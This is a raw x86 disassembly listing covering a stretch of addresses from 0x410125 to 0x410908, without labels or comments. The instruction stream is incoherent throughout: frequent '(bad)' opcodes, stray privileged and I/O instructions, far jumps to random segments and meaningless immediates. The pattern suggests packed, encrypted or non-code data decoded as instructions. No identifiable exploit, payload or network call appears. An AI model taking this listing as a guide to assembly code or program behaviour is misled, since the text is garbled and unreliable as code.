  410125:	mov    ecx,ss
  410127:	imul   ecx
  410129:	xchg   ebp,eax
  41012a:	xchg   ebx,eax
  41012b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41012c:	fwait
  41012d:	mov    ds:0xc77b2c6,al
  410132:	(bad)  
  410133:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410134:	cmp    eax,0x546378cc
  410139:	xchg   ebp,eax
  41013a:	xchg   esp,eax
  41013b:	dec    esp
  41013c:	icebp  
  41013d:	adc    bh,BYTE PTR [eax-0x6f]
  410140:	pop    esi
  410141:	dec    esp
  410142:	or     ah,BYTE PTR [edx-0x488e13a4]
  410148:	lea    edx,[ecx]
  41014a:	push   ss
  41014b:	aam    0x6c
  41014d:	push   edx
  41014e:	out    0xcd,al
  410150:	mov    dl,0xa1
  410152:	jle    0x410131
  410154:	or     al,BYTE PTR [ebp+0x4]
  410157:	xor    BYTE PTR [edx-0x7ae13d46],al
  41015d:	pop    es
  41015e:	jb     0x4101ab
  410160:	jg     0x410188
  410162:	push   ebx
  410163:	push   esi
  410164:	sub    edi,DWORD PTR [ebx]
  410166:	pop    edx
  410167:	(bad)  
  410168:	mov    WORD PTR [eax],?
  41016a:	jmp    0xba94:0xe8b4bf62
  410171:	push   esi
  410172:	xchg   edx,eax
  410173:	ss xchg esp,eax
  410175:	xchg   BYTE PTR [ecx+ecx*4-0x37d4eb6f],bh
  41017c:	retf   
  41017d:	jnp    0x410174
  41017f:	xchg   ebp,eax
  410180:	lea    esi,[ebx+edx*8+0xd]
  410184:	cmp    eax,0x53c43708
  410189:	sub    BYTE PTR [ebx-0x72],0xa3
  41018d:	es push ebp
  41018f:	xor    eax,0x68852053
  410194:	add    DWORD PTR [eax+0x3284122d],ecx
  41019a:	pusha  
  41019b:	ja     0x4101d5
  41019d:	aas    
  41019e:	arpl   si,bx
  4101a0:	sbb    dh,cl
  4101a2:	cmp    al,0x2d
  4101a4:	jp     0x41015a
  4101a6:	mov    dh,0x31
  4101a8:	adc    dh,BYTE PTR [ecx-0x6b2ca71b]
  4101ae:	lock ret 0xf1b4
  4101b2:	inc    esp
  4101b3:	(bad)  
  4101b4:	icebp  
  4101b5:	pop    ebp
  4101b6:	and    eax,0x8ec7beb5
  4101bb:	cmp    BYTE PTR [ebx+0x26],bl
  4101be:	sub    BYTE PTR [edi],0x97
  4101c1:	(bad)  
  4101c2:	jmp    0x7087:0xe13780e0
  4101c9:	xchg   esp,eax
  4101ca:	test   BYTE PTR [ecx-0x1295dac3],ah
  4101d0:	xchg   edx,eax
  4101d1:	or     eax,0x2bd09d9e
  4101d6:	test   edx,edx
  4101d8:	leave  
  4101d9:	iret   
  4101da:	aam    0x53
  4101dc:	xor    ecx,DWORD PTR [esi+ecx*2-0x76a2d863]
  4101e3:	sahf   
  4101e4:	or     ch,cl
  4101e6:	and    ah,BYTE PTR [ebp-0x39]
  4101e9:	or     edx,DWORD PTR [eax-0x3fe99787]
  4101ef:	in     al,0xfd
  4101f1:	outs   dx,BYTE PTR ds:[esi]
  4101f2:	daa    
  4101f3:	sbb    DWORD PTR [edx],0xdce81fe7
  4101f9:	mov    dh,0xd9
  4101fb:	aam    0x15
  4101fd:	jg     0x410198
  4101ff:	add    DWORD PTR [edx+eiz*4-0x3b56d0],ebp
  410206:	mov    dh,0x83
  410208:	sbb    al,0x9f
  41020a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41020b:	adc    eax,0xe43b6674
  410210:	adc    eax,0x82646082
  410215:	loope  0x41025d
  410217:	or     eax,0x8508b2e9
  41021c:	sub    eax,0x7747d4fb
  410221:	inc    ebx
  410222:	retf   0x479e
  410225:	retf   
  410226:	pop    ss
  410227:	cli    
  410228:	add    ch,ch
  41022a:	sub    BYTE PTR [edx+0x53100b98],bl
  410230:	or     ecx,DWORD PTR [ecx+0x6b]
  410233:	xchg   edi,eax
  410234:	sub    ebp,DWORD PTR [ebx]
  410236:	fadd   st,st(6)
  410238:	mov    edi,0xcd19469
  41023d:	test   al,0xd9
  41023f:	mov    edx,0xd0427e6d
  410244:	sar    DWORD PTR [esp],cl
  410247:	inc    di
  410249:	dec    ebp
  41024a:	adc    al,0x7b
  41024c:	test   al,0xc7
  41024e:	and    eax,0xd585c465
  410253:	lea    ebp,[esi+0x78]
  410256:	mov    edi,0xf8eddfa
  41025b:	aam    0x61
  41025d:	fidiv  WORD PTR [esi+0x19]
  410260:	lock neg al
  410263:	nop
  410264:	das    
  410265:	repnz lea esi,[edx]
  410268:	js     0x410227
  41026a:	bound  eax,QWORD PTR [edx]
  41026c:	xor    edx,DWORD PTR [edx+esi*4]
  41026f:	(bad)  
  410270:	pop    ebx
  410271:	hlt    
  410272:	mov    dl,0x25
  410274:	mul    bl
  410276:	ret    0xa12f
  410279:	(bad)  
  41027b:	inc    esi
  41027c:	dec    edx
  41027d:	repnz test al,0xd
  410280:	rcl    DWORD PTR [eax-0x3ed035f2],cl
  410286:	dec    edi
  410287:	push   es
  410288:	repnz or ecx,ecx
  41028b:	(bad)  
  41028f:	inc    edi
  410290:	inc    edi
  410291:	rcl    edi,0x31
  410294:	mov    ecx,0x6f56f3fc
  410299:	les    edi,FWORD PTR [edx*8-0x3fa2fad0]
  4102a0:	jnp    0x4102a8
  4102a2:	adc    DWORD PTR [ebx],ecx
  4102a4:	fdivr  QWORD PTR [edx-0x408c3353]
  4102aa:	jnp    0x410248
  4102ac:	call   0x68df:0xffa25dbd
  4102b3:	sbb    cl,BYTE PTR [eax]
  4102b5:	cmp    cl,BYTE PTR [ecx+edi*2]
  4102b8:	add    eax,0x8f90474
  4102bd:	or     BYTE PTR [esi-0x741c831c],al
  4102c3:	push   0x4d55c9ac
  4102c8:	push   cs
  4102c9:	push   cs
  4102ca:	or     al,0x1a
  4102cc:	cmp    al,0x2c
  4102ce:	jle    0x410327
  4102d0:	push   esp
  4102d1:	aas    
  4102d2:	in     eax,dx
  4102d3:	ja     0x410350
  4102d5:	xchg   ebp,eax
  4102d6:	mov    al,0x2c
  4102d8:	sbb    DWORD PTR [edx],esp
  4102da:	std    
  4102db:	dec    ecx
  4102dc:	pop    esi
  4102dd:	add    cl,BYTE PTR [edx-0x3bcc7b1e]
  4102e3:	sar    BYTE PTR [ebx+0x3c],0xb0
  4102e7:	std    
  4102e8:	popf   
  4102e9:	retf   0x9582
  4102ec:	js     0x4102e3
  4102ee:	call   0x86b0:0xc5e2f5c2
  4102f5:	push   0xffffffaa
  4102f7:	pop    ebp
  4102f8:	sbb    ebx,ebp
  4102fa:	xor    ch,0x42
  4102fd:	adc    al,0x95
  4102ff:	lods   al,BYTE PTR ds:[esi]
  410300:	arpl   WORD PTR [eax],ax
  410302:	mov    al,0xe
  410304:	(bad)  
  410305:	sahf   
  410306:	hlt    
  410307:	fild   DWORD PTR [eax+0x71]
  41030a:	xchg   DWORD PTR [esi],ebx
  41030c:	lods   eax,DWORD PTR ds:[esi]
  41030d:	push   esi
  41030e:	hlt    
  41030f:	call   DWORD PTR [ebx+edx*8-0x5ba9fe77]
  410316:	fimul  WORD PTR [ecx-0x3c]
  410319:	inc    ecx
  41031a:	enter  0x5775,0xfa
  41031e:	outs   dx,DWORD PTR ds:[esi]
  41031f:	popf   
  410320:	inc    ebp
  410321:	dec    esi
  410322:	loop   0x4102af
  410324:	sbb    BYTE PTR [edi+0x16777dd5],bl
  41032a:	inc    edx
  41032b:	mov    eax,ds:0x8c831f90
  410330:	test   al,0xa1
  410332:	xor    ebp,DWORD PTR [esi+0xbbf6a34]
  410338:	mul    BYTE PTR [ebx-0x8d8fc17]
  41033e:	hlt    
  41033f:	jmp    0xb4cf:0x4611368d
  410346:	and    al,bl
  410348:	in     eax,0x8f
  41034a:	or     DWORD PTR [edi-0x78f3b84],esi
  410350:	pop    ebp
  410351:	jb     0x410362
  410353:	ret    
  410354:	cdq    
  410355:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410356:	push   es
  410357:	mov    ch,0x48
  410359:	add    cl,ch
  41035b:	mov    edx,DWORD PTR [ecx-0x2c]
  41035e:	jecxz  0x410358
  410360:	retf   0x61ae
  410363:	or     dh,BYTE PTR [edi+0x25]
  410366:	adc    ch,dl
  410368:	mov    ah,cl
  41036a:	fldcw  WORD PTR ds:0xf036212f
  410370:	inc    sp
  410372:	gs jbe 0x410315
  410375:	sub    eax,0xc2a1dc9e
  41037a:	cmc    
  41037b:	lahf   
  41037c:	cmp    DWORD PTR [ebp-0x5f],esi
  41037f:	mov    al,0x42
  410381:	xor    BYTE PTR [edx-0x1c],0x3a
  410385:	mov    ebp,0x5dc9a4fd
  41038a:	pop    ss
  41038b:	and    BYTE PTR [ebp-0x2edaf88b],dh
  410391:	hlt    
  410392:	sub    cl,BYTE PTR [ecx-0x18]
  410395:	stos   BYTE PTR es:[edi],al
  410396:	aad    0xa6
  410398:	inc    esp
  410399:	add    eax,0x4772e871
  41039e:	mov    esi,0x545330b3
  4103a3:	and    al,0xb9
  4103a5:	or     BYTE PTR [ebp+0x445e290b],dl
  4103ab:	punpckhbw mm4,QWORD PTR [ecx+0x311bced]
  4103b2:	cwde   
  4103b3:	mov    dh,0xe6
  4103b5:	hlt    
  4103b6:	dec    edx
  4103b7:	stos   DWORD PTR es:[edi],eax
  4103b8:	shl    BYTE PTR [ebp+0x3dcc3eac],0xd4
  4103bf:	xchg   DWORD PTR [ecx-0x77],edi
  4103c2:	jl     0x410417
  4103c4:	das    
  4103c5:	or     DWORD PTR [esi],eax
  4103c7:	movzx  edi,WORD PTR [edx+0xd]
  4103cb:	mov    edx,0x1904c225
  4103d0:	push   ss
  4103d1:	xchg   edx,eax
  4103d2:	dec    esi
  4103d3:	and    al,0x96
  4103d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4103d6:	ret    0x20ea
  4103d9:	fstp   DWORD PTR [esi-0x2dd5b083]
  4103df:	inc    ecx
  4103e0:	js     0x41043d
  4103e2:	frstor [esi-0x33]
  4103e5:	(bad)  
  4103e6:	inc    ecx
  4103e7:	call   0x4e98:0x8083657a
  4103ee:	jbe    0x4103ff
  4103f0:	jo     0x4103f6
  4103f2:	or     BYTE PTR [eax+0x5],ch
  4103f5:	ret    
  4103f6:	out    dx,eax
  4103f7:	pop    ss
  4103f8:	mov    ecx,0x2f0a2c89
  4103fd:	push   es
  4103fe:	xchg   edi,eax
  4103ff:	pop    edi
  410400:	call   0x43c9:0xccb2e46
  410407:	js     0x4103f9
  410409:	mov    BYTE PTR [ebx-0x4907baa0],cl
  41040f:	sti    
  410410:	loopne 0x41048e
  410412:	aad    0xf
  410414:	xchg   edx,eax
  410415:	mov    eax,0xccd5d680
  41041a:	hlt    
  41041b:	mov    DWORD PTR [eax+0x12],esp
  41041e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41041f:	shl    DWORD PTR [esi+edx*8],0x2
  410423:	mov    esp,ebx
  410425:	icebp  
  410426:	repz jecxz 0x4103c9
  410429:	pop    es
  41042a:	mov    edx,0xb91cb6f4
  41042f:	mov    eax,ds:0x48b7c025
  410434:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410435:	push   ecx
  410436:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410437:	shr    BYTE PTR [ebx+0x63f4f516],cl
  41043d:	das    
  41043e:	push   ecx
  41043f:	in     eax,dx
  410440:	hlt    
  410441:	pushf  
  410442:	cmp    eax,0x3ba065ab
  410447:	ret    0xed6b
  41044a:	pop    edi
  41044b:	int    0x76
  41044d:	dec    eax
  41044e:	dec    edi
  41044f:	cdq    
  410450:	ins    BYTE PTR es:[edi],dx
  410451:	xchg   esi,eax
  410452:	cwde   
  410453:	imul   ecx,DWORD PTR [eax-0x1e],0x78
  410457:	mov    al,ds:0x460d4991
  41045c:	stos   BYTE PTR es:[edi],al
  41045d:	pop    ebx
  41045e:	or     al,0x72
  410460:	lock or bh,BYTE PTR [eax+ebp*8-0x5a]
  410465:	sahf   
  410466:	sbb    esi,ebp
  410468:	test   BYTE PTR [eax+0x30e16017],dl
  41046e:	jmp    0x3b92:0x648b6c32
  410475:	fldenv [ebp-0x6]
  410478:	adc    ah,dl
  41047a:	cmp    dh,BYTE PTR es:0xece59d5b
  410481:	test   eax,0xb9cb04f5
  410486:	xor    eax,0x4f066312
  41048b:	pop    eax
  41048c:	pushf  
  41048d:	push   ss
  41048e:	mov    al,0x89
  410490:	or     BYTE PTR [eax],dl
  410492:	adc    al,0x7d
  410494:	inc    edi
  410495:	dec    eax
  410496:	call   0x9a910d52
  41049b:	int3   
  41049c:	pop    di
  41049e:	dec    ecx
  41049f:	loop   0x41043c
  4104a1:	inc    ebx
  4104a2:	push   0x37d8eda8
  4104a7:	and    ebp,DWORD PTR [edi+0x50]
  4104aa:	jb     0x41046b
  4104ac:	neg    BYTE PTR [esp+edx*4]
  4104af:	cli    
  4104b0:	dec    eax
  4104b2:	leave  
  4104b3:	mov    eax,0xb98fc964
  4104b8:	push   ss
  4104b9:	in     al,dx
  4104ba:	xchg   ebp,eax
  4104bb:	sbb    al,0x76
  4104bd:	adc    eax,0xbf2bea42
  4104c2:	nop
  4104c3:	push   ebx
  4104c4:	cwde   
  4104c5:	pop    esp
  4104c6:	in     al,0x4d
  4104c8:	push   edi
  4104c9:	test   al,0x47
  4104cb:	lock or eax,0x4e1b7226
  4104d1:	or     eax,0xb4204ab0
  4104d6:	js     0x410524
  4104d8:	lods   al,BYTE PTR ds:[esi]
  4104d9:	cld    
  4104da:	lock imul edx,DWORD PTR [esp+esi*2+0x12cb59b1],0x37
  4104e3:	mov    eax,ds:0x6d079bc2
  4104e8:	jae    0x41055f
  4104ea:	imul   DWORD PTR [esi-0x5547549c]
  4104f0:	mov    esi,0xcedb3346
  4104f5:	push   edx
  4104f6:	xchg   esp,eax
  4104f7:	retf   0x3a90
  4104fa:	xchg   DWORD PTR [ebp+0x56],edi
  4104fd:	inc    ebx
  4104fe:	test   al,0xbf
  410500:	mov    ebp,0x19b41cd
  410505:	push   0x5b
  410507:	push   ebp
  410508:	adc    al,BYTE PTR [edi]
  41050a:	and    eax,0x83742e49
  41050f:	or     ebp,eax
  410511:	dec    ebx
  410512:	adc    al,0x33
  410514:	clc    
  410515:	mov    ebp,0x50516787
  41051a:	jb     0x4104fa
  41051c:	cmp    ch,BYTE PTR [esi+0x25]
  41051f:	fs mov esi,0xfaf6ec54
  410525:	(bad)  
  410526:	aaa    
  410527:	or     BYTE PTR [esi+edi*2],cl
  41052a:	(bad)  
  41052b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41052c:	lea    ebx,[edx-0x315ab1d]
  410532:	pop    ecx
  410533:	rol    ebx,1
  410535:	repnz adc edx,DWORD PTR [edi-0x2f038456]
  41053c:	inc    ebx
  41053d:	xchg   edi,eax
  41053e:	mov    BYTE PTR [ebp-0x1a],bl
  410541:	mov    bh,0x9d
  410543:	add    eax,0x22898f14
  410548:	retf   
  410549:	cmp    al,0x92
  41054b:	cmp    DWORD PTR [edi+0x5450d07b],esi
  410551:	xchg   edi,eax
  410552:	jb     0x410513
  410554:	mov    eax,0x71dd40bf
  410559:	mov    WORD PTR ds:0xa65c2d02,ss
  41055f:	dec    ebp
  410560:	stc    
  410561:	dec    ecx
  410562:	das    
  410563:	sbb    esp,ebp
  410565:	jno    0x410588
  410567:	pop    edx
  410568:	xlat   BYTE PTR ds:[ebx]
  410569:	pop    ds
  41056a:	(bad)  
  41056b:	fsub   st(1),st
  41056d:	lods   eax,DWORD PTR gs:[esi]
  41056f:	pop    esp
  410570:	popa   
  410571:	push   0xae3955fb
  410576:	scas   eax,DWORD PTR es:[edi]
  410577:	shl    cl,0xa
  41057a:	fst    QWORD PTR [ebx+edx*2-0x76]
  41057e:	(bad)  
  41057f:	aas    
  410580:	sub    BYTE PTR [eax],dh
  410582:	cld    
  410583:	pop    es
  410584:	sbb    BYTE PTR [esi*1+0x7cf48b20],al
  41058b:	jns    0x41052d
  41058d:	mov    ah,0xc0
  41058f:	xor    BYTE PTR [ebx-0x6d],dl
  410592:	dec    ebx
  410593:	inc    ebp
  410594:	cld    
  410595:	fcomp  DWORD PTR [esi]
  410597:	loope  0x4105d6
  410599:	inc    esi
  41059a:	jmp    DWORD PTR ss:[eax-0x3a22d9bb]
  4105a1:	mov    al,0x2e
  4105a3:	scas   eax,DWORD PTR es:[edi]
  4105a4:	loopne 0x4105b5
  4105a6:	push   eax
  4105a7:	mov    esi,0xc875c817
  4105ac:	shl    eax,1
  4105ae:	out    dx,eax
  4105af:	push   edx
  4105b0:	in     eax,0x91
  4105b2:	sub    ecx,DWORD PTR [edi+esi*4-0x5353a495]
  4105b9:	pop    ds
  4105ba:	xor    BYTE PTR [ecx+0x1cec4130],dh
  4105c0:	and    BYTE PTR [ebp-0x60af7212],al
  4105c6:	fstp   QWORD PTR [eax+0x4a]
  4105c9:	into   
  4105ca:	jle    0x4105eb
  4105cc:	mov    dl,0x5e
  4105ce:	bound  esi,QWORD PTR [ebp+0x1d]
  4105d1:	sbb    bl,al
  4105d3:	aaa    
  4105d4:	out    dx,eax
  4105d5:	push   cs
  4105d6:	iret   
  4105d7:	int3   
  4105d8:	outs   dx,DWORD PTR ds:[esi]
  4105d9:	les    ecx,FWORD PTR [esi-0x18]
  4105dc:	dec    BYTE PTR [edi-0x7c]
  4105df:	adc    dl,BYTE PTR [ebp-0x19]
  4105e2:	jmp    0x410599
  4105e4:	push   cs
  4105e5:	adc    DWORD PTR [eax+0x1c3b216a],ebx
  4105eb:	arpl   WORD PTR [edx-0x5f],sp
  4105ee:	and    ah,BYTE PTR [ebx-0x49555ce9]
  4105f4:	jae    0x410626
  4105f6:	jmp    0xbc24caed
  4105fb:	sub    al,0xbc
  4105fd:	bound  esp,QWORD PTR [edi]
  4105ff:	loope  0x4105e4
  410601:	jg     0x410660
  410603:	push   ebx
  410604:	push   edx
  410605:	mov    bl,0xf0
  410607:	pushf  
  410608:	jne    0x41067d
  41060a:	fld    st(6)
  41060c:	jno    0x410672
  41060e:	mov    cl,0x79
  410610:	lods   eax,DWORD PTR ds:[esi]
  410611:	fidivr WORD PTR [ebx+0x4d2608bf]
  410617:	pop    esi
  410618:	jnp    0x41068e
  41061a:	mov    ch,0x64
  41061c:	(bad)  
  41061d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41061e:	cmp    bh,ch
  410620:	adc    BYTE PTR [ecx+ebx*1-0x26],al
  410624:	(bad)  
  410625:	popf   
  410626:	pop    ebp
  410627:	retf   0xd63e
  41062a:	gs push eax
  41062c:	cmp    DWORD PTR [esi+eiz*2],eax
  41062f:	inc    ecx
  410630:	imul   ecx,DWORD PTR [eax-0x2ca4681b],0xffffffb2
  410637:	jle    0x410608
  410639:	mov    edx,0x46ba7598
  41063e:	outs   dx,DWORD PTR ds:[esi]
  41063f:	sar    bh,0x7a
  410642:	sbb    eax,0x1c324ec1
  410647:	ror    DWORD PTR [ebx],0xb2
  41064a:	gs (bad) 
  41064c:	cli    
  41064d:	push   0x6d04e1b7
  410652:	pop    edi
  410653:	ss add eax,0x200f367
  410659:	sar    BYTE PTR [ebx+0xf],cl
  41065c:	jb     0x41061f
  41065e:	mov    dh,0x50
  410660:	adc    eax,0xdf2789fe
  410665:	enter  0xb85c,0xdc
  410669:	xchg   esi,eax
  41066a:	call   0x3f7f:0x1e2ae3fd
  410671:	inc    ecx
  410672:	pop    edx
  410673:	in     eax,dx
  410674:	int    0xed
  410676:	std    
  410677:	add    BYTE PTR [esi+edi*2],0xd3
  41067b:	dec    ecx
  41067c:	fldenv [esi+0x3]
  41067f:	retf   0x6ae5
  410682:	lds    esp,FWORD PTR [edx]
  410684:	and    ecx,DWORD PTR [esp]
  410687:	aas    
  410688:	repz cmp dh,BYTE PTR [eax-0x57ba4507]
  41068f:	xlat   BYTE PTR ds:[ebx]
  410690:	adc    al,0x0
  410692:	cmp    ch,BYTE PTR [ebx+edx*8+0x39]
  410696:	sub    eax,0x31fc51c8
  41069b:	sub    dl,al
  41069d:	push   esp
  41069e:	adc    al,0x70
  4106a0:	aad    0xa
  4106a2:	iret   
  4106a3:	pop    edx
  4106a4:	popf   
  4106a5:	pop    ds
  4106a6:	(bad)  
  4106a7:	xchg   esp,eax
  4106a8:	mov    ebx,0x71a4923e
  4106ad:	inc    ebp
  4106ae:	push   cs
  4106af:	cli    
  4106b0:	js     0x4106bc
  4106b2:	xchg   esi,eax
  4106b3:	repnz lock pop edi
  4106b6:	fnstsw WORD PTR [ecx+0x6782a346]
  4106bc:	sub    BYTE PTR ds:0xa4cf24d3,ah
  4106c2:	iret   
  4106c3:	or     ebp,edi
  4106c5:	mov    esp,0xdbab676
  4106ca:	pop    ecx
  4106cb:	push   ebx
  4106cc:	out    dx,al
  4106cd:	in     ax,0x7f
  4106d0:	(bad)  
  4106d1:	std    
  4106d2:	lds    ebp,FWORD PTR es:0xb8b56287
  4106d9:	cmp    edx,DWORD PTR gs:[eax+0x412ed4f2]
  4106e0:	jmp    0x79915624
  4106e5:	popf   
  4106e6:	lock mov dl,0xe
  4106e9:	and    ah,dh
  4106eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106ec:	mov    DWORD PTR [ebx+edi*4],ebx
  4106ef:	retf   0x82ec
  4106f2:	push   ds
  4106f3:	push   eax
  4106f4:	dec    eax
  4106f5:	iret   
  4106f6:	lea    ebx,[ebx-0x21]
  4106f9:	das    
  4106fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4106fb:	outs   dx,BYTE PTR ds:[esi]
  4106fc:	xor    ebp,DWORD PTR [ecx-0x6d]
  4106ff:	(bad)  
  410700:	jmp    0x4106ab
  410702:	push   ebx
  410703:	sub    al,0xb8
  410705:	inc    edi
  410706:	sub    BYTE PTR [edx-0x1b],bl
  410709:	or     ebx,esi
  41070b:	inc    edx
  41070c:	push   eax
  41070d:	jmp    0x4106cc
  41070f:	bound  ebx,QWORD PTR [edx]
  410711:	inc    ebp
  410712:	mov    cl,0x95
  410714:	sub    edx,DWORD PTR [ebp-0x6a]
  410717:	or     eax,0x1937bf9b
  41071c:	add    BYTE PTR [edx],ah
  41071e:	pop    es
  41071f:	mov    gs,WORD PTR [edi-0x7f]
  410722:	cli    
  410723:	mov    bh,0x20
  410725:	and    al,0x1b
  410727:	in     eax,dx
  410728:	fwait
  410729:	or     eax,0x15154304
  41072e:	out    dx,al
  41072f:	(bad)
  410732:	dec    ebx
  410733:	loope  0x4106d1
  410735:	test   eax,0x14d59d3e
  41073a:	ins    DWORD PTR es:[edi],dx
  41073b:	cld    
  41073c:	xor    DWORD PTR [edx+0x1bdcda92],ecx
  410742:	push   ebx
  410743:	int    0xbc
  410745:	repz leave 
  410747:	push   cs
  410748:	and    eax,0x1c74ff8e
  41074d:	aas    
  41074e:	or     DWORD PTR [edi],esi
  410750:	adc    DWORD PTR [edi+ecx*8],ecx
  410753:	scas   al,BYTE PTR es:[edi]
  410754:	ins    DWORD PTR es:[edi],dx
  410755:	push   esi
  410756:	sub    ch,al
  410758:	out    dx,eax
  410759:	bound  edi,QWORD PTR cs:[ecx]
  41075c:	cmovp  edx,DWORD PTR [edx]
  41075f:	push   ebx
  410760:	push   edx
  410761:	dec    ecx
  410762:	stos   BYTE PTR es:[edi],al
  410763:	stc    
  410764:	stc    
  410765:	jo     0x410769
  410767:	out    0xc0,eax
  410769:	cmp    DWORD PTR [ecx-0x24325fa7],edi
  41076f:	in     al,0xf7
  410771:	ret    0x6a99
  410774:	imul   edi,ebp,0xbd171c87
  41077a:	loopne 0x41074d
  41077c:	popf   
  41077d:	lea    ecx,[ecx]
  41077f:	pop    es
  410780:	sar    cl,1
  410782:	jns    0x4107c4
  410784:	jne    0x410759
  410786:	jnp    0x410799
  410788:	xchg   edi,eax
  410789:	push   esi
  41078a:	sbb    esi,DWORD PTR [ecx]
  41078c:	dec    esi
  41078d:	(bad)  
  41078f:	call   0xff73:0x5401f506
  410796:	ror    BYTE PTR ds:0xcf1948ab,cl
  41079c:	inc    esi
  41079d:	push   ecx
  41079e:	jmp    0xc8e2:0xd1796ca3
  4107a5:	sub    ecx,esp
  4107a7:	cmp    al,0xd
  4107a9:	stos   DWORD PTR es:[edi],eax
  4107aa:	sahf   
  4107ab:	repnz lds ecx,FWORD PTR gs:[ebp-0x12276690]
  4107b3:	scas   al,BYTE PTR es:[edi]
  4107b4:	push   eax
  4107b5:	sbb    al,dh
  4107b7:	xchg   ecx,eax
  4107b8:	or     al,BYTE PTR [ebp-0x59]
  4107bb:	push   ecx
  4107bc:	fadd   st(7),st
  4107be:	stc    
  4107bf:	call   0x2371:0xcdd2a167
  4107c6:	outs   dx,BYTE PTR ds:[esi]
  4107c7:	gs pop ebx
  4107c9:	xchg   ecx,esp
  4107cb:	cmp    edx,DWORD PTR [edx]
  4107cd:	test   eax,0xd4068011
  4107d2:	into   
  4107d3:	fistp  QWORD PTR [eax]
  4107d5:	cmp    edi,DWORD PTR [ecx-0x4e]
  4107d8:	push   es
  4107d9:	cmp    al,0xef
  4107db:	xor    ecx,DWORD PTR [edi]
  4107dd:	mov    edx,0x68f49b68
  4107e2:	aaa    
  4107e3:	std    
  4107e4:	pop    esi
  4107e5:	ror    DWORD PTR [esi+0x2de9394e],0xf1
  4107ec:	jns    0x410823
  4107ee:	div    esi
  4107f0:	mov    ebx,0xa613922b
  4107f5:	sub    ch,ch
  4107f7:	test   DWORD PTR [edi+0x7ee7a4f5],0x3890d412
  410801:	call   0x81de4d8d
  410806:	inc    edx
  410807:	ret    0xfc4f
  41080a:	cmp    eax,DWORD PTR [ebx-0x52]
  41080d:	stos   DWORD PTR es:[edi],eax
  41080e:	pop    ds
  41080f:	pop    esi
  410810:	jmp    0x4107b5
  410812:	push   ebx
  410813:	or     al,0xe1
  410815:	sahf   
  410816:	mov    WORD PTR [esi],?
  410818:	dec    esp
  410819:	add    BYTE PTR [ebx],dl
  41081b:	push   ebp
  41081c:	lahf   
  41081d:	mov    ebp,0xd2eee48a
  410822:	mov    ecx,0xa98e624c
  410827:	add    eax,0xb279692b
  41082c:	in     al,0xc7
  41082e:	sbb    eax,ecx
  410830:	mov    cl,0x3d
  410832:	(bad)  
  410834:	push   ds
  410835:	pop    ebx
  410836:	test   DWORD PTR [eax],ecx
  410838:	repnz mov bh,0xac
  41083b:	or     esi,DWORD PTR [ebx+0x71]
  41083e:	and    BYTE PTR [esi+eax*4+0x2ab788fc],bl
  410845:	icebp  
  410846:	sbb    al,BYTE PTR [edi]
  410848:	cmp    al,0xcf
  41084a:	(bad)  
  41084b:	into   
  41084c:	pop    edi
  41084d:	pop    ss
  41084e:	loope  0x410892
  410850:	cmp    esi,DWORD PTR [edi-0x78f74e54]
  410856:	mov    BYTE PTR [ebp-0x60],cl
  410859:	dec    edi
  41085a:	fimul  DWORD PTR [ebp+0x50]
  41085d:	fnstcw WORD PTR [eax+0x6d]
  410860:	xor    ebp,DWORD PTR [ebp+0x6e]
  410863:	inc    eax
  410864:	and    edx,DWORD PTR [ebp+edx*2-0x5a50e78e]
  41086b:	icebp  
  41086c:	cli    
  41086d:	fidivr DWORD PTR [esi-0x59]
  410870:	inc    ebx
  410871:	shl    edx,1
  410873:	das    
  410874:	xor    edx,DWORD PTR [edx-0x7a]
  410877:	nop
  410878:	mov    bh,BYTE PTR [ecx+0x4b4bbde5]
  41087e:	outs   dx,BYTE PTR ds:[esi]
  41087f:	sbb    BYTE PTR [eax],dl
  410881:	les    ecx,FWORD PTR [esi+0x73]
  410884:	xor    ebx,0xffffff82
  410887:	aam    0x74
  410889:	(bad)  
  41088a:	aad    0xff
  41088c:	mov    ebp,0xa83400d0
  410891:	pop    ss
  410892:	je     0x410858
  410894:	cmp    eax,0x115c316
  410899:	test   eax,edi
  41089b:	lds    edi,FWORD PTR [edi]
  41089d:	int3   
  41089e:	outs   dx,BYTE PTR ds:[esi]
  41089f:	ins    DWORD PTR es:[edi],dx
  4108a0:	push   cs
  4108a1:	mov    edi,0x2faf706d
  4108a6:	cmp    al,0xea
  4108a8:	cmp    bl,BYTE PTR [ebx]
  4108aa:	ins    BYTE PTR es:[edi],dx
  4108ab:	(bad)  
  4108ac:	retw   0x3a83
  4108b0:	mov    ds:0x638291fa,eax
  4108b5:	(bad)  
  4108b6:	pushf  
  4108b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108b8:	lods   eax,DWORD PTR ds:[esi]
  4108b9:	mov    ecx,0x8fd3c51a
  4108be:	pusha  
  4108bf:	and    al,0xbe
  4108c2:	scas   al,BYTE PTR es:[edi]
  4108c3:	add    eax,0x51f07709
  4108c8:	fbstp  TBYTE PTR [ebx+0x70b16a88]
  4108ce:	fs jno 0x4108a8
  4108d1:	xor    DWORD PTR [eax],0x7e
  4108d4:	mov    eax,ds:0x9cf9811e
  4108d9:	dec    edi
  4108da:	adc    bl,BYTE PTR [edx]
  4108dc:	or     ecx,esi
  4108de:	idiv   bl
  4108e0:	fst    QWORD PTR [ecx+0x6a]
  4108e3:	inc    edi
  4108e4:	mov    ebp,0x360cfd6d
  4108e9:	aam    0x52
  4108eb:	fsubr  DWORD PTR [eax-0xc28facc]
  4108f1:	add    eax,0xf16e51a0
  4108f6:	pop    ds
  4108f7:	xchg   esi,eax
  4108f8:	mov    dh,0x40
  4108fa:	ins    BYTE PTR es:[edi],dx
  4108fb:	scas   eax,DWORD PTR es:[edi]
  4108fc:	dec    ecx
  4108fd:	push   esp
  4108fe:	(bad)  
  4108ff:	fcomp  QWORD PTR ds:0xc0151163
  410905:	dec    eax
  410906:	je     0x410956
  410908:	xchg   BYTE PTR ds:0x58abd391,cl
